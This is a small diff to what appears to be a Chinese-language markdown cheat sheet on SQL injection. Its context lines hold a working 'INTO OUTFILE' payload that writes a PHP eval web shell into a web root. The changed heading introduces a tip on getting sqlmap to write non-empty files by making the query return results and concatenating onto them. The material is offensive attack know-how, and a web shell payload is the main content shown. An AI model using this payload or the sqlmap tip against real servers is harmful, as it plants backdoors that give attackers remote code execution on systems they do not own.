@@ -47,7 +47,7 @@ INTO OUTFILE/DUMPFILE
 ```
 SELECT '<? @eval($_POST[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
 ```
-*注入拼接写文件payload——sqlmap写文件为空解决方法*：    
+##### 注入拼接写文件payload——sqlmap写文件为空解决方法    
 sqlmap写文件为空原因在于查询结果为空所以结尾也没有添加自定义字符     
 因此，1.构造正确查询有结果;2.拼接查询结果
 ```
